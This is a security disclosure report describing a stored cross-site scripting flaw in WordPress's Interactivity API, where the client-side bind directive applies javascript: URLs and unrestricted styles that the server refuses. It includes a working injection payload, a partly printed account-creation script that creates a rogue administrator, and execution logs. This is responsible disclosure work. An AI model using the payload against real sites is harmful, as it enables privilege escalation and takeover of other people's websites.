# Contributor → stored XSS → site takeover: the Interactivity API's `bind` directive applies `javascript:` URLs that the server refused to write

## Summary

`wp_kses()` allows any `data-*` attribute on any allowed tag, so a user **without
`unfiltered_html`** (Contributor is enough) can put a complete Interactivity API
island — `data-wp-interactive`, `data-wp-context` and `data-wp-bind--*` — into
ordinary post content.

WordPress is aware that a bound attribute value is attacker-influenced and
guards it **on the server**: `WP_HTML_Tag_Processor::set_attribute()` runs
`esc_url()` over every attribute in `wp_kses_uri_attributes()`, so the server
refuses to emit `href="javascript:…"`.

The **client** runtime that ships in core applies the very same binding with no
check at all. `wp-includes/js/dist/script-modules/interactivity/index.js`
routes `href` straight to `el.setAttribute()` with the raw value, and routes
`style` straight to `el.style.cssText`.

The result is that the browser writes exactly the attribute the server declined:

```
server rendered : <a id="pwnlink" data-wp-bind--href="context.u" data-wp-bind--style="context.s">
after hydration : href  = "javascript:fetch('/wp-admin/user-new.php')…"
                  style = "position: fixed; inset: 0px; z-index: 2147483647; display: block;"
```

The `style` binding bypasses `safecss_filter_attr()` in the same motion (it has
no `position`, `inset` or `z-index`), which lets the attacker stretch that
`javascript:` anchor over the whole viewport. **One click anywhere on the page**
then runs attacker script in the site's origin.

I did not stop at `alert()`. In the run quoted below, a Contributor's post,
published by an Editor through the ordinary review workflow, created a **new
administrator account** in the session of an administrator who opened the post
and clicked once.

Confirmed by execution on **WordPress 7.1** (current release) and on **7.0.4**.

## Severity

**CVSS 3.1 9.0 (Critical)** — `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H`

`S:C` because the injected script executes in the browser of a different user
and acts with that user's authority; that is the standard scoping for stored
XSS and matches how comparable WordPress Core stored-XSS reports have been
scored. If the program prefers `S:U`, the same vector scores **7.9 (High)**.
Either way it clears the 4.0 floor comfortably.

CWE-79 (stored XSS), with CWE-1289 (inconsistent validation between the
server-side and client-side implementations of the same feature) as the
underlying defect.

## Affected

| version | result |
|---|---|
| **7.1** (current) | **confirmed by execution** — full chain, administrator account created |
| **7.0.4** | **confirmed by execution** — `href` and `style` both applied, script executed |

Both installs carry the identical guards and the identical runtime:

```
wordpress/wp-includes/kses.php:1629                          preg_match( '/^data-[a-z0-9_-]+$/', $name_low, $match )
wp704/wp-includes/kses.php:1543                              preg_match( '/^data-[a-z0-9_-]+$/', $name_low, $match )
wordpress/wp-includes/html-api/class-wp-html-tag-processor.php:4648   ? esc_url( $value )
wp704/wp-includes/html-api/class-wp-html-tag-processor.php:4373       ? esc_url( $value )
```

and the two shipped `interactivity/index.js` bundles differ only in three
`catch (e) {` → `catch {` rewrites — the `bind` directive is byte-identical.

I am claiming only the two versions I actually executed. The client `bind`
directive has had no URL handling since the Interactivity API shipped in 6.5,
so earlier 6.x releases are very likely affected too, but I have not run them
and do not assert it.

## Root cause

Three pieces, each defensible alone.

### 1. kses deliberately allows the directives through

`data-*` is a global attribute for every allowed tag
(`wp-includes/kses.php:433`, in `_wp_add_global_attributes()`):

```php
$global_attributes = array(
    …
    'class'            => true,
    'data-*'           => true,
    …
);
```

and `wp_kses_attr_check()` (`wp-includes/kses.php:1628-1635`) admits any
`data-` name matching `/^data-[a-z0-9_-]+$/`:

```php
if ( str_starts_with( $name_low, 'data-' ) && ! empty( $allowed_attr['data-*'] )
    && preg_match( '/^data-[a-z0-9_-]+$/', $name_low, $match )
) {
    $allowed_attr[ $match[0] ] = $allowed_attr['data-*'];
```

The character class contains `-`, so the Interactivity API's double-dash form
`data-wp-bind--href` passes. This is intentional: Trac
[#61052](https://core.trac.wordpress.org/ticket/61052) relaxed kses precisely so
that Interactivity directives survive `wp_kses_post()`. That decision is not the
bug — it is the reason the directives reach the renderer.

### 2. The server knows the value is dangerous and refuses it

`WP_Interactivity_API::data_wp_bind_processor()` evaluates the reference and
writes it (`wp-includes/interactivity-api/class-wp-interactivity-api.php:1243`):

```php
$p->set_attribute( $entry['suffix'], $result );
```

`WP_HTML_Tag_Processor::set_attribute()`
(`wp-includes/html-api/class-wp-html-tag-processor.php:4642-4662`) escapes
according to the attribute:

```php
$escaped_new_value = in_array( $comparable_name, wp_kses_uri_attributes(), true )
    ? esc_url( $value )
    : strtr( $value, array( '<' => '&lt;', '>' => '&gt;', '&' => '&amp;',
                            '"' => '&quot;', "'" => '&apos;' ) );

// If the escaping functions wiped out the update, reject it and indicate it was rejected.
if ( '' === $escaped_new_value && '' !== $value ) {
    return false;
}
```

`href` is in `wp_kses_uri_attributes()`, `esc_url()` drops the disallowed
scheme, the result is empty, and the update is rejected. Verified directly
against every scheme-smuggling variant I could think of:

```
href benign        <a href="https://example.com/ok" data-wp-bind--href="context.u">
href relative      <a href="/ok" data-wp-bind--href="context.u">
href mailto        <a href="mailto:a@b.c" data-wp-bind--href="context.u">
href javascript    <a data-wp-bind--href="context.u">          <- refused
href JaVaScRiPt    <a data-wp-bind--href="context.u">          <- refused
href js tab        <a data-wp-bind--href="context.u">          <- refused
href leading sp    <a data-wp-bind--href="context.u">          <- refused
href newline       <a data-wp-bind--href="context.u">          <- refused
href data html     <a data-wp-bind--href="context.u">          <- refused
href vbscript      <a data-wp-bind--href="context.u">          <- refused
href entity        <a data-wp-bind--href="context.u">          <- refused
href colon enc     <a data-wp-bind--href="context.u">          <- refused
```

The server side is doing its job. The point of quoting it is that core has
already decided this value must not become a URL attribute.

### 3. The client applies it anyway

`wp-includes/js/dist/script-modules/interactivity/index.js:2641-2692`, the
`bind` directive:

```js
directive("bind", ({ directives: { bind }, element, evaluate }) => {
  bind.filter(isNonDefaultDirectiveSuffix).forEach((entry) => {
    …
    const attribute = entry.suffix;
    let result = evaluate(entry);
    …
    element.props[attribute] = result;
    useInit(() => {
      const el = element.ref.current;
      if (attribute === "style") {
        if (typeof result === "string") {
          el.style.cssText = result;        // <-- no safecss_filter_attr equivalent
        }
        return;
      } else if (attribute !== "width" && attribute !== "height"
              && attribute !== "href" && attribute !== "list" && attribute !== "form"
              && … && attribute in el) {
        try { el[attribute] = result ?? ""; return; } catch {}
      }
      if (result !== null && result !== void 0 && (result !== false || attribute[4] === "-")) {
        el.setAttribute(                     // <-- no esc_url equivalent
          attribute,
          attribute === "popover" && result === true ? "" : result
        );
      } …
    });
  });
});
```

`href` is explicitly listed in the exclusion chain, so it skips the property
branch and lands on the raw `el.setAttribute()`. There is no scheme check
anywhere in the bundle — grepping the whole 104 KB file for `javascript`,
`protocol`, `sanitiz` or `esc` returns nothing relevant.

The server-side hardening is therefore only a speed bump: whatever the server
declines to write, the browser writes a few hundred milliseconds later.

The 6.9.2 hardening that blocks `on*` suffixes in `data_wp_bind_processor()` is
the same shape of fix, applied server-side only, and shows the team already
treats bound values as untrusted.

## Steps to reproduce

Preconditions: a default WordPress 7.1 install with a block theme
(Twenty Twenty-Five), and a Contributor account. No plugins.

1. **As the Contributor**, submit a post for review whose content is:

   ```html
   <div data-wp-interactive='{"namespace":"pwn"}'
        data-wp-context='{"u": "javascript:PAYLOAD", "s": "position:fixed;top:0px;left:0px;right:0px;bottom:0px;z-index:2147483647;display:block"}'>
     <a id="pwnlink" data-wp-bind--href="context.u" data-wp-bind--style="context.s">&nbsp;</a>
   </div>
   ```

   Any transport works — `POST /wp/v2/posts` or the block editor. Note the
   payload must contain no literal `<` or `>`, because kses's tag splitter would
   truncate the attribute; everything needed is expressible without them.

2. **As an Editor**, publish it. This is the normal review workflow, not an
   extra privilege the attacker needs — an Author can skip this step and publish
   their own post directly.

3. **As an administrator**, open the published post on the front end and click
   anywhere.

`PAYLOAD` in the run below is the account-creation script; a bare
`window.__PWNED__=document.domain;void 0` is enough to demonstrate execution.

Runnable end-to-end script: `poc/evidence_iapi.py` (7.1) and `poc/t_iapi_704.py`
(7.0.4). Both drive real HTTP with ordinary logged-in cookies plus `X-WP-Nonce`
— exactly what the block editor sends — and a real headless Chromium.

## Proof

Literal output of `poc/evidence_iapi.py` against WordPress 7.1
(`poc/evidence_iapi.txt`):

```
==============================================================================
A. Contributor submits the post. kses is the only thing between the
   attacker and the front end, and it keeps every directive.
==============================================================================
   contributor role caps: unfiltered_html = False
   POST /wp/v2/posts -> 201 id 1008 status pending
   stored content (this IS the kses output):
      <div data-wp-interactive="{&quot;namespace&quot;:&quot;pwn&quot;}" data-wp-context="{&quot;u&quot;: &quot;javascript:fetch(&apos;/wp-admin/user-new.php&apos;).then(function(r){return r.text()}).then(function(t){var n=t.match(/_wpnonce_create-user. value=.([a-f0-9]+)/)[1];var b=new URLSearchParams(); ...
   directives that survived: ['data-wp-interactive', 'data-wp-context', 'data-wp-bind--href', 'data-wp-bind--style']
   editor publishes it -> 200 publish | http://localhost:8371/?p=1008

==============================================================================
B. The SERVER refuses both bindings.
   href  -> esc_url()            in WP_HTML_Tag_Processor::set_attribute()
   style -> safecss_filter_attr() has no position / inset / z-index
==============================================================================
    <a id="pwnlink" data-wp-bind--href="context.u" data-wp-bind--style="context.s">
    href= written by the server : False
    style= written by the server: False
    interactivity runtime on the page: True

==============================================================================
C. The BROWSER applies both, and one click takes the site over.
==============================================================================
   users before: user_login,roles | admin,administrator | author,author | contributor,contributor | editor,editor | subscriber,subscriber
   an administrator is logged in in this browser: True
   DOM href : javascript:fetch('/wp-admin/user-new.php').then(function(r){return r.text()}).then(functio ...
   DOM style: position: fixed; inset: 0px; z-index: 2147483647; display: block;
   anchor {'w': 1280, 'h': 720} vs viewport {'w': 1280, 'h': 720} -> the link covers the entire page: True
   one click at the centre of the page -> {"status": 200}
   users after : user_login,user_email,roles | admin,admin@example.test,administrator | author,author@example.test,author | contributor,contributor@example.test,contributor | editor,editor@example.test,editor | pwned,pwned@attacker.example,administrator | subscriber,subscriber@example.test,subscriber

==============================================================================
D. Honest precondition: the runtime has to be on the page.
   Rendering the same content with the interactivity module suppressed.
==============================================================================
   DOM href with the runtime blocked: null
```

The one line that matters: `pwned,pwned@attacker.example,administrator` appears
in the user table after a single click, and was not there before.

WordPress 7.0.4, same chain (`poc/evidence_iapi_704.txt`):

```
stored directives: ['data-wp-interactive', 'data-wp-context', 'data-wp-bind--href', 'data-wp-bind--style']
server anchor      : <a id="pwnlink" data-wp-bind--href="context.u" data-wp-bind--style="context.s">
server wrote href= : False
runtime on page    : True
DOM href           : "javascript:window.__PWNED__=document.domain;void 0"
DOM style          : "position: fixed; inset: 0px; z-index: 2147483647; display: block;"
executed           : "localhost"
```

## Impact

* **Privilege escalation from the lowest content-authoring role to
  Administrator.** Demonstrated, not argued: the account `pwned` with role
  `administrator` exists in `wp_users` after the click. From there the usual
  consequences follow, including plugin/theme upload, i.e. code execution on the
  host.
* **Stored, so it hits every visitor**, not just the reviewer. Once the post is
  public, any logged-in user who clicks is running the attacker's script with
  their own authority; any anonymous visitor is at least exposed to phishing and
  redirection from a first-party URL.
* **The overlay removes the usual "would anyone actually click that link?"
  objection.** The `style` binding is not decoration — it is what turns a
  click-on-this-specific-link vector into a click-anywhere-on-the-page vector,
  and it works precisely because the client has no `safecss_filter_attr()`.
* **The attacker never needs `unfiltered_html`**, and never needs to defeat
  kses. kses is working as designed; the payload is a legal `data-*` attribute.

## Honest limits

Stated so the severity is not read as broader than what I verified.

* **The Interactivity runtime must already be on the page.** Section D above
  proves the dependency by blocking the module and watching the exploit die.
  In practice this is close to always true on a modern install: the runtime is
  enqueued by any interactive block, and the default block theme's
  `core/navigation` block puts it on every front-end view. On a classic theme
  with no interactive block anywhere on the page, the payload is inert. I have
  not surveyed how many real sites fall on each side of that line.
* **One click is required** (`UI:R`). It is a click *anywhere* on the page
  rather than on a specific link, but it is still a click. There is no
  zero-interaction variant in this report.
* **Front end only.** The Interactivity runtime is not loaded in `wp-admin`, so
  this does not fire while an administrator is in the dashboard. It fires when
  they view the post, which is exactly what a reviewer does.
* **Not an `unfiltered_html` self-XSS.** Contributor and Author do not hold that
  capability on the tested install; I checked
  (`contributor role caps: unfiltered_html = False`).
* The payload cannot contain a literal `<` or `>`, since kses's tag splitter
  would truncate the attribute. This constrains payload style but not
  capability — the account-creation script above contains neither.
* The account-creation step uses `wp-admin/user-new.php` and its
  `_wpnonce_create-user` nonce, both read same-origin by the injected script.
  Nothing about it depends on the lab; it is the ordinary admin form.
* I did not find a way to reach this through `wp-admin`, and I am not claiming
  one.

## Exclusions I checked this against

Against the program's listed exclusions:

* *"Users with administrator or editor privileges can post arbitrary
  JavaScript"* — does not apply. The injecting role is **Contributor**, the
  lowest role that can author content; the Editor in the chain is the *victim's*
  side of the workflow (the reviewer who publishes), not a privilege the
  attacker holds. An Author publishing their own post reaches the same result
  with no second party at all.
* *Self-XSS / `unfiltered_html`* — does not apply; capability verified absent,
  and the script executes in *other* users' sessions.
* *Theoretical vulnerabilities without a PoC* — does not apply; every claim in
  this report is quoted from an execution, including the resulting row in
  `wp_users`.
* *Unverified scanner or AI output* — does not apply; see the disclosure below.
  Nothing here is asserted from reading code alone.
* The finding is in **WordPress Core**, and per the program's scope note,
  "Issues in WordPress Core and Gutenberg are in scope regardless of user role,
  as long as they have a security impact."

## Suggested fix

The server and the client must agree on what a bound value is allowed to
become. Two changes, either of which breaks the chain, both of which are worth
having:

1. **Sanitize URL attributes in the client `bind` directive**, mirroring
   `esc_url()` / `wp_allowed_protocols()`. Concretely, in
   `directive("bind", …)`, before the `el.setAttribute()` call, reject values
   whose scheme is not allowed for attributes in `wp_kses_uri_attributes()`
   (`href`, `src`, `action`, `formaction`, `data`, `poster`, `xmlns`, …). The
   server already has the list; the client should not be the weaker of the two.

2. **Apply a CSS allowlist to the `style` binding**, mirroring
   `safecss_filter_attr()`, instead of assigning `el.style.cssText` wholesale.
   Even with (1) in place, unrestricted `position`/`z-index` from unprivileged
   post content is a clickjacking primitive against the site's own UI.

A narrower alternative — dropping `data-wp-*` from the kses `data-*` allowance
so islands cannot be declared from post content — would also close it, but it
would reverse Trac #61052 and break legitimate block markup, so I would expect
(1) and (2) to be preferred.

## Prior art

I searched before writing this up and found nothing describing this
client/server disagreement: no CVE, no WPScan/Patchstack entry, no Trac
security ticket, and no public write-up. The nearby public material is Trac
[#61052](https://core.trac.wordpress.org/ticket/61052) and
[#61501](https://core.trac.wordpress.org/ticket/61501), which are about
*allowing* these attributes through kses and do not discuss the binding sink,
and the 6.9.2 `on*` hardening, which is server-side only. If this duplicates
something non-public, I am happy to have it closed as such.

## AI tooling disclosure

Per the WordPress AI Guidelines: I used an AI coding assistant (Claude Code)
throughout this audit — to read the 7.1 tree, to form the hypothesis, and to
write the PoC scripts and this report. **No claim in this report rests on model
output.** Every statement was produced by executing code against a live
install: the kses behaviour, the server's refusal, the browser's application of
the binding, the click, and the resulting administrator row were all observed,
and the scripts that produce them are attached so you can re-run them. Where an
early hypothesis was wrong it was discarded rather than written up; two are
recorded in the accompanying `README.md` as negative results.

## Environment

* WordPress 7.1 (`$wp_version = '7.1'`), stock, Twenty Twenty-Five, no plugins
* Control: WordPress 7.0.4, same configuration
* PHP 8.4.19 CLI server, MariaDB 10.11.14
* Chromium 1194 via Playwright 1.62, headless
* Users: `admin`, `editor`, `author`, `contributor`, `subscriber`, each with its
  stock role and no capability edits
